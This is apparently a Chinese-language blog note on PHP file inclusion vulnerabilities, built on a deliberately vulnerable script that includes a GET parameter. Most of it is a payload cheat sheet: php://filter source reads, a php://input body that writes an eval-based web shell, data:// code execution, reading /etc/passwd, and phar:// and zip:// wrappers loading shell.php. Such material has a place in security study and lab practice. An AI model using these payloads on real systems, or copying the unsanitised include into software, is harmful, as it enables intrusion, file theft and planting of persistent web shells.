---
title: 文件包含
date: 2024-01-25 21:02:22
tags:
---

```txt
1.php
<?php
if($_GET['a']!=null){
	include $_GET['a'];
	}else{
	include "home.php";
}
?>
```

include

![allow_url_include=On](https://raw.githubusercontent.com/20231201/123/main/allow_url_include%3DOn.png)

![默认](https://raw.githubusercontent.com/20231201/123/main/默认.png)

![设置参数为a.txt，include会转换成php文件执行](https://raw.githubusercontent.com/20231201/123/main/设置参数为a.txt，include会转换成php文件执行.png)

![远程访问](https://raw.githubusercontent.com/20231201/123/main/远程访问.png)

![读取敏感文件](https://raw.githubusercontent.com/20231201/123/main/读取敏感文件.png)

![username](https://raw.githubusercontent.com/20231201/123/main/username.png)

![在get传参处运行phpinfo](https://raw.githubusercontent.com/20231201/123/main/在get传参处运行phpinfo.png)

#要实现远程文件包含需要allow_url_fopen和allow_url_include都开启
#读文件(需要开启 allow_url_fopen)
?filename=php://filter/read=convert.base64-encode/resource=xxx.php 
?filename=php://filter/convert.base64-encode/resource=xxx.php      
#post传值（需开启 allow_url_include）
?file=php://input 
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["test"])?>');?>
#代码执行(php>=5.2.0)
data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 
data:text/plain,<?php phpinfo();?>
#file读文件
?abc=file:///etc/passwd
#phar（>=5.3.0）
?file=phar://压缩包/内部文件 phar://xxx.png（压缩包）/shell.php （内部文件）
#zip（PHP > =5.3.0，注意在windows下测试要5.3.0<PHP<5.4 才
可以 #在浏览器中要编码为%23）
?file=zip://[压缩文件绝对路径]%23[压缩文件内的子文件名] 
zip://xxx.png#shell.php          
